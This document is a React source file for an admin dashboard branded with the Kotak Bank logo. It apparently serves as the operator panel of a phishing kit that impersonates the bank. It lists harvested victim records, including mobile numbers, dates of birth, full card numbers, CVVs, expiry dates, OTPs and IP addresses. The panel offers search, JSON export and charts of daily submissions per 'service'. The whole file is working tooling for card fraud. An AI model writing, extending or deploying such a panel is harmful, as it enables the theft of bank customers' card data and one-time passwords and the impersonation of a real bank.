import React, { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import { 
  BiCog, BiTrash, BiLogOut, BiSearch, BiDownload, BiShow, BiHide, 
  BiUser, BiMenu, BiX, BiHome, BiData, BiBell
} from 'react-icons/bi'
import { 
  BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, ResponsiveContainer, 
  PieChart, Pie, Cell, LineChart, Line, AreaChart, Area 
} from 'recharts'

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:3000/api'

const COLORS = ['#8b5cf6', '#3b82f6', '#10b981', '#f59e0b', '#ef4444', '#ec4899']

export default function AdminDashboard() {
  const navigate = useNavigate()
  const [users, setUsers] = useState([])
  const [sidebarOpen, setSidebarOpen] = useState(true)
  const [activeMenu, setActiveMenu] = useState('dashboard')
  const [currentPassword, setCurrentPassword] = useState('')
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [settingsError, setSettingsError] = useState('')
  const [settingsSuccess, setSettingsSuccess] = useState('')
  const [searchTerm, setSearchTerm] = useState('')
  const [showCvv, setShowCvv] = useState({})
  const [loading, setLoading] = useState(true)
  const [currentPage, setCurrentPage] = useState(1)
  const itemsPerPage = 30

  useEffect(() => {
    const token = localStorage.getItem('kotakAdminToken')
    if (!token) {
      navigate('/admin')
      return
    }
    loadUsers()
  }, [])

  const loadUsers = async () => {
    setLoading(true)
    try {
      const res = await fetch(`${API_URL}/users`)
      const data = await res.json()
      if (data.success) {
        setUsers(data.data)
      }
    } catch (err) {
      console.error('Error loading users:', err)
    }
    setLoading(false)
  }

  const handleLogout = () => {
    localStorage.removeItem('kotakAdminToken')
    navigate('/admin')
  }

  const handleChangePassword = async () => {
    setSettingsError('')
    setSettingsSuccess('')
    
    if (!currentPassword || !newPassword || !confirmPassword) {
      setSettingsError('Please fill all fields')
      return
    }

    if (newPassword !== confirmPassword) {
      setSettingsError('New passwords do not match')
      return
    }

    if (newPassword.length < 4) {
      setSettingsError('Password must be at least 4 characters')
      return
    }

    try {
      const res = await fetch(`${API_URL}/admin/change-password`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ currentPassword, newPassword })
      })
      const data = await res.json()
      
      if (data.success) {
        setSettingsSuccess('Password changed successfully')
        setCurrentPassword('')
        setNewPassword('')
        setConfirmPassword('')
      } else {
        setSettingsError(data.error)
      }
    } catch (err) {
      setSettingsError('Failed to change password')
    }
  }

  const handleDeleteAllData = async () => {
    if (window.confirm('Are you sure you want to delete all user data? This action cannot be undone.')) {
      try {
        await fetch(`${API_URL}/users`, { method: 'DELETE' })
        setUsers([])
        alert('All data deleted successfully')
      } catch (err) {
        alert('Failed to delete data')
      }
    }
  }

  const handleDeleteUser = async (id) => {
    if (window.confirm('Are you sure you want to delete this user?')) {
      try {
        await fetch(`${API_URL}/users`, { 
          method: 'DELETE',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id })
        })
        setUsers(users.filter(u => u.id !== id))
        alert('User deleted successfully')
      } catch (err) {
        alert('Failed to delete user')
      }
    }
  }

  const toggleCvv = (index) => {
    setShowCvv(prev => ({ ...prev, [index]: !prev[index] }))
  }

  const hideCvv = (cvv, show) => {
    return show ? cvv : '•••'
  }

  const filteredUsers = users.filter(user => 
    user.mobile?.includes(searchTerm) ||
    user.card_number?.includes(searchTerm) ||
    user.service?.toLowerCase().includes(searchTerm.toLowerCase())
  )

  const totalPages = Math.ceil(filteredUsers.length / itemsPerPage)
  const paginatedUsers = filteredUsers.slice((currentPage - 1) * itemsPerPage, currentPage * itemsPerPage)

  useEffect(() => {
    setCurrentPage(1)
  }, [searchTerm])

  const exportData = () => {
    const dataStr = JSON.stringify(filteredUsers, null, 2)
    const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr)
    const exportFileDefaultName = 'kotak_users_data.json'
    const linkElement = document.createElement('a')
    linkElement.setAttribute('href', dataUri)
    linkElement.setAttribute('download', exportFileDefaultName)
    linkElement.click()
  }

  // Chart data
  const getServiceData = () => {
    const services = {}
    users.forEach(user => {
      services[user.service] = (services[user.service] || 0) + 1
    })
    return Object.entries(services).map(([name, value]) => ({ name, value }))
  }

  const getDailyData = () => {
    const last7Days = []
    for (let i = 6; i >= 0; i--) {
      const date = new Date()
      date.setDate(date.getDate() - i)
      const dateStr = date.toDateString()
      const count = users.filter(u => new Date(u.created_at).toDateString() === dateStr).length
      last7Days.push({
        date: date.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' }),
        users: count
      })
    }
    return last7Days
  }

  const menuItems = [
    { id: 'dashboard', icon: <BiHome />, label: 'Dashboard' },
    { id: 'users', icon: <BiData />, label: 'User Data' },
    { id: 'notifications', icon: <BiBell />, label: 'Notifications' },
    { id: 'settings', icon: <BiCog />, label: 'Settings' },
  ]

  const renderContent = () => {
    switch(activeMenu) {
      case 'dashboard':
        return (
          <>
            {/* Stats Cards */}
            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
              <div className="bg-gray-800 rounded-2xl p-5 shadow-lg border border-gray-700">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">Total Users</p>
                    <p className="text-3xl font-bold mt-1 text-white">{users.length}</p>
                  </div>
                  <div className="w-12 h-12 bg-red-600/20 rounded-xl flex items-center justify-center">
                    <BiUser className="text-2xl text-purple-500" />
                  </div>
                </div>
              </div>
              <div className="bg-gray-800 rounded-2xl p-5 shadow-lg border border-gray-700">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">Today</p>
                    <p className="text-3xl font-bold mt-1 text-white">
                      {users.filter(u => {
                        const today = new Date().toDateString()
                        return new Date(u.created_at).toDateString() === today
                      }).length}
                    </p>
                  </div>
                  <div className="w-12 h-12 bg-blue-600/20 rounded-xl flex items-center justify-center">
                    <BiData className="text-2xl text-blue-500" />
                  </div>
                </div>
              </div>
              <div className="bg-gray-800 rounded-2xl p-5 shadow-lg border border-gray-700">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">Services</p>
                    <p className="text-3xl font-bold mt-1 text-white">6</p>
                  </div>
                  <div className="w-12 h-12 bg-green-600/20 rounded-xl flex items-center justify-center">
                    <BiCog className="text-2xl text-green-500" />
                  </div>
                </div>
              </div>
              <div className="bg-gray-800 rounded-2xl p-5 shadow-lg border border-gray-700">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-gray-400 text-sm">This Week</p>
                    <p className="text-3xl font-bold mt-1 text-white">
                      {users.filter(u => {
                        const weekAgo = new Date()
                        weekAgo.setDate(weekAgo.getDate() - 7)
                        return new Date(u.created_at) >= weekAgo
                      }).length}
                    </p>
                  </div>
                  <div className="w-12 h-12 bg-orange-600/20 rounded-xl flex items-center justify-center">
                    <BiBell className="text-2xl text-orange-500" />
                  </div>
                </div>
              </div>
            </div>

            {/* Charts Row */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
              {/* Line Chart - Daily Users */}
              <div className="bg-gray-800 rounded-2xl p-6 shadow-lg border border-gray-700">
                <h3 className="text-lg font-semibold text-white mb-4">User Registrations (Last 7 Days)</h3>
                <div className="h-64 w-full min-h-[200px]">
                  <ResponsiveContainer width="100%" height={users.length > 0 ? "100%" : 200}>
                    <AreaChart data={getDailyData()}>
                      <defs>
                        <linearGradient id="colorUsers" x1="0" y1="0" x2="0" y2="1">
                          <stop offset="5%" stopColor="#8b5cf6" stopOpacity={0.8}/>
                          <stop offset="95%" stopColor="#8b5cf6" stopOpacity={0}/>
                        </linearGradient>
                      </defs>
                      <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                      <XAxis dataKey="date" stroke="#9ca3af" fontSize={12} />
                      <YAxis stroke="#9ca3af" fontSize={12} />
                      <Tooltip 
                        contentStyle={{ backgroundColor: '#1f2937', border: '1px solid #374151', borderRadius: '8px' }}
                        labelStyle={{ color: '#fff' }}
                      />
                      <Area type="monotone" dataKey="users" stroke="#8b5cf6" fillOpacity={1} fill="url(#colorUsers)" />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>
              </div>

              {/* Pie Chart - Services */}
              <div className="bg-gray-800 rounded-2xl p-6 shadow-lg border border-gray-700">
                <h3 className="text-lg font-semibold text-white mb-4">Services Distribution</h3>
                <div className="h-64 w-full min-h-[200px]">
                  <ResponsiveContainer width="100%" height={users.length > 0 ? "100%" : 200}>
                    <PieChart>
                      <Pie
                        data={getServiceData()}
                        cx="50%"
                        cy="50%"
                        innerRadius={60}
                        outerRadius={80}
                        paddingAngle={5}
                        dataKey="value"
                      >
                        {getServiceData().map((entry, index) => (
                          <Cell key={`cell-${index}`} fill={COLORS[index % COLORS.length]} />
                        ))}
                      </Pie>
                      <Tooltip 
                        contentStyle={{ backgroundColor: '#1f2937', border: '1px solid #374151', borderRadius: '8px' }}
                        labelStyle={{ color: '#fff' }}
                      />
                    </PieChart>
                  </ResponsiveContainer>
                </div>
                <div className="flex flex-wrap justify-center gap-3 mt-4">
                  {getServiceData().map((entry, index) => (
                    <div key={entry.name} className="flex items-center">
                      <div className="w-3 h-3 rounded-full mr-2" style={{ backgroundColor: COLORS[index % COLORS.length] }}></div>
                      <span className="text-gray-400 text-sm">{entry.name}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Bar Chart - Daily Comparison */}
            <div className="bg-gray-800 rounded-2xl p-6 shadow-lg border border-gray-700 mb-6">
              <h3 className="text-lg font-semibold text-white mb-4">Daily User Activity</h3>
              <div className="h-64 w-full min-h-[200px]">
                <ResponsiveContainer width="100%" height={users.length > 0 ? "100%" : 200}>
                  <BarChart data={getDailyData()}>
                    <CartesianGrid strokeDasharray="3 3" stroke="#374151" />
                    <XAxis dataKey="date" stroke="#9ca3af" fontSize={12} />
                    <YAxis stroke="#9ca3af" fontSize={12} />
                    <Tooltip 
                      contentStyle={{ backgroundColor: '#1f2937', border: '1px solid #374151', borderRadius: '8px' }}
                      labelStyle={{ color: '#fff' }}
                    />
                    <Bar dataKey="users" fill="#8b5cf6" radius={[4, 4, 0, 0]} />
                  </BarChart>
                </ResponsiveContainer>
              </div>
            </div>

            {/* Quick User Table Preview */}
            <div className="bg-gray-800 rounded-2xl shadow-lg border border-gray-700 overflow-hidden">
              <div className="p-4 lg:p-6 border-b border-gray-700 flex justify-between items-center">
                <div>
                  <h2 className="text-lg font-semibold text-white">Recent Users</h2>
                  <p className="text-gray-400 text-sm mt-1">Latest user submissions</p>
                </div>
                <button
                  onClick={() => setActiveMenu('users')}
                  className="text-purple-400 hover:text-purple-300 font-medium text-sm"
                >
                  View All →
                </button>
              </div>
              <div className="overflow-x-auto">
                <table className="w-full min-w-[700px]">
                  <thead>
                    <tr className="bg-gray-900/50">
                      <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">#</th>
                      <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Service</th>
                      <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Mobile</th>
                      <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Card</th>
                      <th className="px-4 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Date</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-700">
                    {users.slice(0, 5).map((user, index) => (
                      <tr key={user.id} className="hover:bg-gray-700/50">
                        <td className="px-4 py-3 text-sm text-gray-400">{index + 1}</td>
                        <td className="px-4 py-3 text-sm text-white font-medium">{user.service}</td>
                        <td className="px-4 py-3 text-sm text-gray-300">{user.mobile}</td>
                        <td className="px-4 py-3 text-sm text-gray-300">
                          {user.card_number}
                        </td>
                        <td className="px-4 py-3 text-sm text-gray-500">
                          {user.created_at ? new Date(user.created_at).toLocaleDateString() : '-'}
                        </td>
                        <td className="px-4 py-3">
                          <button onClick={() => handleDeleteUser(user.id)} className="text-red-400 hover:text-red-300 text-sm">
                            Delete
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </>
        )

      case 'users':
        return (
          <div className="bg-gray-800 rounded-2xl shadow-lg border border-gray-700 overflow-hidden">
            <div className="p-4 lg:p-6 border-b border-gray-700 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
              <div>
                <h2 className="text-lg font-semibold text-white">All User Data</h2>
                <p className="text-gray-400 text-sm mt-1">Total submissions: {users.length}</p>
              </div>
              <button
                onClick={exportData}
                className="flex items-center px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition"
              >
                <BiDownload className="mr-2" />
                Export JSON
              </button>
            </div>

            <div className="p-4 lg:p-6">
              <div className="relative mb-4">
                <BiSearch className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search by mobile, card number or service..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full pl-10 pr-4 py-3 bg-gray-700 border border-gray-600 rounded-xl outline-none focus:ring-2 focus:ring-purple-500 text-white placeholder-gray-400"
                />
              </div>

              {loading ? (
                <div className="text-center py-12">
                  <div className="w-12 h-12 border-4 border-red-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
                  <p className="text-gray-400 mt-4">Loading...</p>
                </div>
              ) : filteredUsers.length === 0 ? (
                <div className="text-center py-12">
                  <BiUser className="w-16 h-16 text-gray-600 mx-auto mb-4" />
                  <p className="text-gray-400 text-lg">No data found</p>
                </div>
              ) : (
                <div>
                  <div className="overflow-x-auto">
                    <table className="w-full min-w-[1000px]">
                      <thead>
                        <tr className="bg-gray-900/50">
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">#</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Service</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Mobile</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">DOB</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Card Number</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">CVV</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Expiry</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">OTP</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">IP Address</th>
                          <th className="px-3 py-3 text-left text-xs font-semibold text-gray-400 uppercase">Date</th>
                        </tr>
                      </thead>
                      <tbody className="divide-y divide-gray-700">
                        {paginatedUsers.map((user, index) => (
                          <tr key={user.id} className="hover:bg-gray-700/50">
                            <td className="px-3 py-3 text-sm text-gray-400">{(currentPage - 1) * itemsPerPage + index + 1}</td>
                            <td className="px-3 py-3 text-sm text-white font-medium">{user.service}</td>
                            <td className="px-3 py-3 text-sm text-gray-300">{user.mobile}</td>
                            <td className="px-3 py-3 text-sm text-gray-300">{user.dob}</td>
                            <td className="px-3 py-3 text-sm text-gray-300 font-mono">
                              {user.card_number}
                            </td>
                            <td className="px-3 py-3 text-sm text-gray-300">
                              <div className="flex items-center">
                                <span className="mr-2 font-mono">{hideCvv(user.cvv, showCvv[(currentPage - 1) * itemsPerPage + index])}</span>
                                <button onClick={() => toggleCvv((currentPage - 1) * itemsPerPage + index)} className="text-purple-400">
                                  {showCvv[(currentPage - 1) * itemsPerPage + index] ? <BiHide /> : <BiShow />}
                                </button>
                              </div>
                            </td>
                            <td className="px-3 py-3 text-sm text-gray-300">{user.exp_date}</td>
                            <td className="px-3 py-3 text-sm text-gray-300 font-mono">{user.otp}</td>
                            <td className="px-3 py-3 text-sm text-gray-500">{user.ip_address || '-'}</td>
                            <td className="px-3 py-3 text-sm text-gray-500">
                              {user.created_at ? new Date(user.created_at).toLocaleString() : '-'}
                            </td>
                            <td className="px-3 py-3">
                              <button 
                                onClick={() => handleDeleteUser(user.id)}
                                className="text-red-400 hover:text-red-300 text-sm"
                              >
                                Delete
                              </button>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                  
                  {/* Pagination */}
                  {totalPages > 1 && (
                    <div className="flex items-center justify-between mt-6 pt-4 border-t border-gray-700">
                      <div className="text-sm text-gray-400">
                        Showing {((currentPage - 1) * itemsPerPage) + 1} to {Math.min(currentPage * itemsPerPage, filteredUsers.length)} of {filteredUsers.length} entries
                      </div>
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => setCurrentPage(1)}
                          disabled={currentPage === 1}
                          className="px-3 py-1 rounded bg-gray-700 text-gray-300 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600"
                        >
                          ««
                        </button>
                        <button
                          onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
                          disabled={currentPage === 1}
                          className="px-3 py-1 rounded bg-gray-700 text-gray-300 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600"
                        >
                          «
                        </button>
                        <span className="text-gray-300 px-3">
                          Page {currentPage} of {totalPages}
                        </span>
                        <button
                          onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
                          disabled={currentPage === totalPages}
                          className="px-3 py-1 rounded bg-gray-700 text-gray-300 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600"
                        >
                          »
                        </button>
                        <button
                          onClick={() => setCurrentPage(totalPages)}
                          disabled={currentPage === totalPages}
                          className="px-3 py-1 rounded bg-gray-700 text-gray-300 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600"
                        >
                          »»
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>
        )

      case 'settings':
        return (
          <div className="bg-gray-800 rounded-2xl shadow-lg border border-gray-700 p-6">
            <h2 className="text-xl font-bold text-white mb-6 flex items-center">
              <BiCog className="mr-2 text-purple-500" />
              Settings
            </h2>
            
            {settingsError && (
              <div className="bg-red-900/30 border border-red-700 text-red-400 px-4 py-3 rounded-lg mb-4">
                {settingsError}
              </div>
            )}
            
            {settingsSuccess && (
              <div className="bg-green-900/30 border border-green-700 text-green-400 px-4 py-3 rounded-lg mb-4">
                {settingsSuccess}
              </div>
            )}

            <div className="grid md:grid-cols-2 gap-6">
              <div className="space-y-4">
                <h3 className="font-semibold text-gray-300">Change Password</h3>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-1">Current Password</label>
                  <input
                    type="password"
                    value={currentPassword}
                    onChange={(e) => setCurrentPassword(e.target.value)}
                    className="w-full px-4 py-2.5 bg-gray-700 border border-gray-600 rounded-lg focus:ring-2 focus:ring-purple-500 outline-none text-white"
                    placeholder="Enter current password"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-1">New Password</label>
                  <input
                    type="password"
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    className="w-full px-4 py-2.5 bg-gray-700 border border-gray-600 rounded-lg focus:ring-2 focus:ring-purple-500 outline-none text-white"
                    placeholder="Enter new password"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-400 mb-1">Confirm Password</label>
                  <input
                    type="password"
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    className="w-full px-4 py-2.5 bg-gray-700 border border-gray-600 rounded-lg focus:ring-2 focus:ring-purple-500 outline-none text-white"
                    placeholder="Confirm new password"
                  />
                </div>
                <button
                  onClick={handleChangePassword}
                  className="w-full bg-red-600 text-white py-2.5 rounded-lg font-medium hover:bg-red-700 transition"
                >
                  Update Password
                </button>
              </div>

              <div className="space-y-4">
                <h3 className="font-semibold text-gray-300">Danger Zone</h3>
                <div className="bg-red-900/20 border border-red-800 rounded-lg p-4">
                  <h4 className="font-medium text-red-400 mb-2">Delete All Data</h4>
                  <p className="text-sm text-red-300 mb-4">This will permanently delete all user submissions.</p>
                  <button
                    onClick={handleDeleteAllData}
                    className="w-full bg-red-600 text-white py-2.5 rounded-lg font-medium hover:bg-red-700 transition flex items-center justify-center"
                  >
                    <BiTrash className="mr-2" />
                    Delete All Data
                  </button>
                </div>
              </div>
            </div>
          </div>
        )

      case 'notifications':
        return (
          <div className="bg-gray-800 rounded-2xl shadow-lg border border-gray-700 p-6">
            <h2 className="text-xl font-bold text-white mb-6 flex items-center">
              <BiBell className="mr-2 text-purple-500" />
              Notifications
            </h2>
            <div className="text-center py-12">
              <BiBell className="w-16 h-16 text-gray-600 mx-auto mb-4" />
              <p className="text-gray-400 text-lg">No notifications</p>
              <p className="text-gray-500 text-sm mt-2">System notifications will appear here</p>
            </div>
          </div>
        )

      default:
        return null
    }
  }

  return (
    <div className="flex h-screen bg-gray-900">
      {/* Sidebar */}
      <aside className={`fixed inset-y-0 left-0 z-50 w-64 bg-gray-950 text-white transition-transform duration-300 ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'} lg:relative lg:translate-x-0`}>
        <div className="flex items-center justify-between h-16 px-6 border-b border-gray-800">
          <div className="flex items-center">
            <img 
              src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" 
              alt="Kotak Bank" 
              className="h-8"
            />
            <span className="ml-2 font-bold text-lg">Admin</span>
          </div>
          <button onClick={() => setSidebarOpen(false)} className="lg:hidden text-gray-400 hover:text-white">
            <BiX className="text-2xl" />
          </button>
        </div>

        <nav className="mt-6 px-3">
          {menuItems.map((item) => (
            <button
              key={item.id}
              onClick={() => setActiveMenu(item.id)}
              className={`flex items-center w-full px-4 py-3 mb-1 rounded-lg transition-all ${
                activeMenu === item.id 
                  ? 'bg-red-600 text-white shadow-lg shadow-red-600/30' 
                  : 'text-gray-400 hover:bg-gray-800 hover:text-white'
              }`}
            >
              <span className="text-xl mr-3">{item.icon}</span>
              <span className="font-medium">{item.label}</span>
            </button>
          ))}
        </nav>

        <div className="absolute bottom-0 w-full p-4 border-t border-gray-800">
          <button
            onClick={handleLogout}
            className="flex items-center w-full px-4 py-3 text-red-400 hover:text-red-300 hover:bg-gray-800 rounded-lg transition-all"
          >
            <BiLogOut className="text-xl mr-3" />
            <span className="font-medium">Logout</span>
          </button>
        </div>
      </aside>

      {/* Main Content */}
      <div className="flex-1 flex flex-col overflow-hidden">
        <header className="bg-gray-800 shadow-sm border-b border-gray-700">
          <div className="flex items-center justify-between h-16 px-4 lg:px-6">
            <div className="flex items-center">
              <button onClick={() => setSidebarOpen(true)} className="lg:hidden mr-4 text-gray-300 hover:text-white">
                <BiMenu className="text-2xl" />
              </button>
              <h1 className="text-xl font-semibold text-white">
                {menuItems.find(m => m.id === activeMenu)?.label}
              </h1>
            </div>
            <div className="flex items-center space-x-2">
              <div className="w-8 h-8 bg-red-600 rounded-full flex items-center justify-center">
                <BiUser className="text-white" />
              </div>
              <span className="hidden md:block text-sm font-medium text-gray-300">Admin</span>
            </div>
          </div>
        </header>

        <main className="flex-1 overflow-y-auto p-4 lg:p-6">
          {renderContent()}
        </main>
      </div>

      {sidebarOpen && (
        <div 
          className="fixed inset-0 bg-black/50 z-40 lg:hidden"
          onClick={() => setSidebarOpen(false)}
        ></div>
      )}
    </div>
  )
}
